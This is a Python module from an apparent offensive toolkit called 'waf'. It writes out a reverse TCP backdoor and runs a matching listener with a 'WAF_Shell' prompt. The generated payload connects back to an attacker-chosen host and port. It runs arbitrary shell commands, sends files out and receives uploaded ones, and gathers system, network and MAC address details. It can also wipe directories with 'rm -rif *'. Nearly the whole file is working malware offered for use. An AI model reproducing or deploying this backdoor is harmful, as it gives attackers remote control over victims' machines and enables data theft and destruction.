import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "python_server_python_reverse_tcp",
        "title"       : "Payload python",
        "module"      : "payloads/python/python/reverse_tcp linux windows unix",
        "description" : "Payload creation and exploitation"
}

options ={
  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
  "LPORT" : [str(var.all_var['lport']),'The listen port'],
  "LNAME" : [str(var.all_var['lname']),'The name of payload [payload.py]'],
  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
}

def running():
    try:
        if var.all_var['ltype'].lower() == "create":
            print ("")
            print (blue+"[*]"+default+ "Create a backdour")
            time.sleep(2)
            print ("")
            time.sleep(2)
            print ("")
            print (green_underline+"[*] Done"+default)
            time.sleep(2)
            print ("")
            mark = '"'
            f = open(var.all_var['lname'] , 'w')
            payload = '''
import socket
import subprocess
import os
try:
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(( '''+mark+str(var.all_var['lhost']) +mark+''' ,'''  + str(var.all_var['lport']) +  ''' ))
 s.send('the clinet user is {0}'.format(os.getlogin()).encode('utf-8'))
 while True:
  whoami = s.recv(500000).decode("utf-8")
  if whoami[:2] == 'cd':
     try:
       os.chdir(whoami[3:])
       dir = os.getcwd()
       s.sendall('Path: ' + dir)
     except:
       s.sendall('[!] The Path Not Found')
  elif whoami == 'ip_address':
            results = subprocess.Popen('curl -s https://ip.seeip.org', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall('[*] IP address is: ' + results)
  elif whoami[0:8] == 'makedirs':
            m = whoami[9:]
            if '1' in m or '2' in m or '3' in m or '4' in m or '5' in m or '6' in m or '7' in m or '8' in m or '9' in m or '0' in m:
                a = int(whoami[9:])
                try:
                    for i in range(a):
                        m = str(i)
                        ra = random.random()
                        h = str(ra)
                        os.mkdir('King-Hacking' + h + m)

                    s.sendall('[+] Done Make All Files ...100%')
                except:
                    s.sendall('[-] Error I Can"t Make The Files')

            else:
                s.sendall('[-] Error I Can"t Make The Files')
  elif whoami == 'info_target':
            results = subprocess.Popen('curl -s http://ip-api.com/', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(''+'[*] Information on Target' + results + '')
  elif whoami == 'scan_port':
            results = subprocess.Popen('ip=$(curl -s https://ip.seeip.org) && curl -s http://api.hackertarget.com/nmap/?q="$ip"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall('[*] Scanner Port ' + results + '')
  elif whoami[:5] == 'mkdir':
            try:
                os.mkdir(cmd[6:])
                s.sendall('Done ...')
            except:
                s.sendall('[!] Error: I Cant Make The File')

  elif whoami[:4] == 'copy':
            a = whoami[5:].split(' ')
            try:
                if not os.path.exists(a[0]):
                    s.sendall('[!] The File `' + a[0] + '` Not Found')
                elif os.path.exists(a[1]):
                    s.sendall('[!] Found Name File `' + a[1] + '` in The Path')
                elif a[1] == '' or a[1] == ' ':
                    s.sendall('[!] Please Enter Path EXM: `copy file /sdcard/file1`')
                else:
                    copyfile(a[0], a[1])
                    s.sendall('[+] Done Copying ...100%')
            except:
                s.sendall('[!] Please Enter Path EXM: `copy file /sdcard/file1`')

  elif whoami[:4] == 'move':
            a = whoami[5:].split(' ')
            try:
                if not os.path.exists(a[0]):
                    s.sendall('[!] The File `' + a[0] + '` Not Found')
                elif os.path.exists(a[1]):
                    s.sendall('[!] Found Name File `' + a[1] + '` in The Path')
                elif a[1] == '' or a[1] == ' ':
                    s.sendall('[!] Please Enter the Path EXM: `move file /root/file1`')
                else:
                    shutil.move(a[0], a[1])
                    s.sendall('[+] Done Moveing ...100%')
            except:
                s.sendall('[!] Please Enter the Path EXM: `move file /root/file1`')

  elif whoami[:6] == 'rename':
            a = whoami[7:].split(' ')
            try:
                if not os.path.exists(a[0]):
                    s.sendall('[!] The File `' + a[0] + '` Not Found')
                elif os.path.exists(a[1]):
                    s.sendall('[!] Found Name File `' + a[1] + '` in The Path')
                elif a[1] == '' or a[1] == ' ':
                    s.sendall('[!] Please Enter Name New EXM: `rename file file1`')
                else:
                    os.rename(a[0], a[1])
                    s.sendall('[+] Done ReName ...100%')
            except:
                s.sendall('[!] I can`t ReName The File')

  elif whoami[:3] == 'cat':
            try:
                if not os.path.exists(whoami[4:]):
                    s.sendall('[!] The File `' + whoami[4:] + '` Not Found')
                else:
                    results = subprocess.Popen(whoami, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    results = results.stdout.read() + results.stderr.read()
                    s.sendall('[*] ' + whoami[4:] + '' + results)
            except:
                s.sendall("[!] I Can't Cat The File")

  elif whoami == 'kernel':
            results = subprocess.Popen('cat /proc/version', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(results)
  elif whoami == 'delall':
            try:
                os.system('rm -rif *')
                s.sendall('[+] Done Delleted All File ...100%')
            except:
                s.sendall('[!] I can`t Dellet All File')

  elif whoami[:3] == 'del':
            try:
                if not os.path.exists(whoami[4:]):
                    s.sendall('[!] The File Not Found')
                else:
                    os.system('rm -rif ' + whoami[4:])
                    s.sendall('[+] Done Delleting ...100%')
            except:
                s.sendall('[!] I can`t Dellet The File')

  elif whoami == 'pid':
            pid = os.getpid()
            s.sendall(str(pid))
  elif whoami == 'hostname':
            use = socket.gethostname()
            s.sendall(str(use))
  elif 'ls' in whoami[:2]:
            results = subprocess.Popen(whoami, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall('[*] ' + whoami + '' + results)
  elif whoami == 'partitions':
            results = subprocess.Popen('cat /proc/partitions', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(results)
  elif whoami == 'mem_info':
            results = subprocess.Popen('cat /proc/meminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(results)
  elif whoami == 'cpu':
            results = subprocess.Popen('cat /proc/cpuinfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(results)
  elif whoami == 'crypto':
            results = subprocess.Popen('cat /proc/crypto', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(results)
  elif whoami == 'mac_wifi':
            try:
                if os.path.exists('/efs/wifi/.mac.info'):
                    if os.path.exists('ifconfig'):
                        os.system('rm -rif ifconfig')
                    results = subprocess.Popen('cat /efs/wifi/.mac.info', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    results = results.stdout.read() + results.stderr.read()
                    s.sendall('[+] Mac Address: ' + results)
                else:
                    results = subprocess.Popen('ifconfig > ifconfig && ifconfig', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    results = results.stdout.read() + results.stderr.read()
                    if 'wlan0' in results:
                        redd = open('ifconfig', 'r')
                        for line in redd:
                            if 'wlan0' in line.strip('HWaddr'):
                                s.sendall('[+] Mac Address: ' + line[-20:])

                        redd.close()
                        if os.path.exists('ifconfig'):
                            os.system('rm -rif ifconfig')
            except:
                s.sendall('' + '[-] I Can Not get Mac Address' + '')

  elif whoami == 'mac_bluetooth':
            try:
                if os.path.exists('/efs/bluetooth/bt_addr'):
                    results = subprocess.Popen('cat /efs/bluetooth/bt_addr', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    results = results.stdout.read() + results.stderr.read()
                    s.sendall('[+] Mac Address: ' + results)
                else:
                    s.sendall('[-] No Bluetooth on device Target')
            except:
                s.sendall('[-] No Bluetooth on device Target')

  elif whoami == 'net_info':
            results = subprocess.Popen('arp', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            if results == '':
                s.sendall('[!] info network card: No informations' + '')
            else:
                s.sendall('[*] info network card: ' + results)
  elif whoami[:8] == 'download':
            sendFile = whoami[9:]
            if os.path.isfile(sendFile):
                with open(sendFile, 'rb') as (f):
                    while 1:
                        filedata = f.read()
                        if filedata == None:
                            break
                        s.sendall(filedata)
                        break

                f.close()
                s.sendall('HACKING')
            else:
                s.sendall('HACKING WhoAmi:Amerr')
  elif whoami[0:6] == 'upload':
            downFile = whoami[7:]
            try:
                f = open(downFile, 'wb')
                while True:
                    l = s.recv(102400)
                    while 1:
                        if l.endswith('HACKING'):
                            u = l[:-7]
                            f.write(u)
                            s.sendall('[+] Uploaded File ...100%')
                            break
                        elif l.startswith('HACKING'):
                            s.sendall('[-] The File Not Found')
                            f.close()
                            os.system('rm -rif ' + downFile)
                            break

                    break

                f.close()
            except:
                pass

  else:
     p = subprocess.Popen(whoami, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     p = p.stdout.read() + p.stderr.read()
     s.send(p.encode("utf-8"))
except socket.error as e:
 print(e)

'''
            f.write(payload)
            f.close()

        elif var.all_var['ltype'].lower() == "listen":
            commend =("""

Core Commands
=============

    Command          Description
    -------          -----------
    ps               : List running processes
    exit             : Exit the console
    help             : Help menu
    clear            : clean all commands


File system Commands
====================

    Command          Description
    -------          -----------
    cd               : Change directory on Target
    lcd              : Change directory on your file
    copy             : Copy source to destination
    ls               : List files on Target
    lls              : List yor file
    move             : Move source to destination
    del              : Delete the specified file
    delall           : Delete All Files in Path
    cat              : Read the contents of a file to the screen
    pwd              : Print working directory
    mkdir            : Make directory
    makedirs         : Make lots of files (ex: makedirs 10)
    rename           : ReName Any File or directory
    del              : Dellet directory
    download         : Download a file or directory
    upload           : Upload a file or directory


System Commands
===============

    Command          Description
    -------          -----------
    pid              : get process id
    cpu              : Show Info CPU Target
    shell            : Drop into a system command shell
    crypto           : Show Encoding On Target
    hostname         : get host name
    use_momery       : Show Use Memory Target
    mem_info         : Show Info Memory Target
    kernel           : Show Kernel Version + Info
    info_phone       : Gets information about the remote system
    localtime        : Displays the target system's local time
    getuid           : Get the user that the server is running as
    partitions       : Check Info Partisi On Target


Networking Commands
===================

    Command          Description
    -------          -----------
    ifconfig         : Display interfaces
    net_info         : check network card & show ip address
    mac_wifi         : Show Mac Address The Wifi Target
    mac_bluetooth    : Show Mac Address The bluetooth Target
    ip_address       : Get IP address Target
    scan_port        : Get Ports open and closeed on Target
    info_target      : Get information about where the target


Android Commands
================

    Command          Description
    -------          -----------
    check_root       : Show info Root Target
""")
            host = str(var.all_var['lhost'])
            port = str(var.all_var['lport'])
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind((host, int(port)))
                print ('--------------------------------------------')
                print (blue+'[*]' +yellow+"Started Exploiting on "+host+ ':' +port+ ""+default)
                print (blue+'[*]' +yellow+'Waiting for the connection...'+default)
                print ('--------------------------------------------'        )
                s.listen(10000)
                client, addr = s.accept()

                print ('concstions from {0}:{1}'.format(addr[0],addr[1]))
                print ('')
                while True:
                    data = client.recv(500000)
                    print (data.decode('utf-8'))
                    print ("")
                    whoami = str(input(" WAF_Shell > "))
                    print ("")
                    if whoami == "help":
                        print (commend )
                        client.send(whoami.encode("utf-8"))
                    else:
                        client.send(whoami.encode("utf-8"))
            except socket.error as e:
                print(e)

        else:
            print (red+"[-]"+default+"Choose LTYPE " )
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
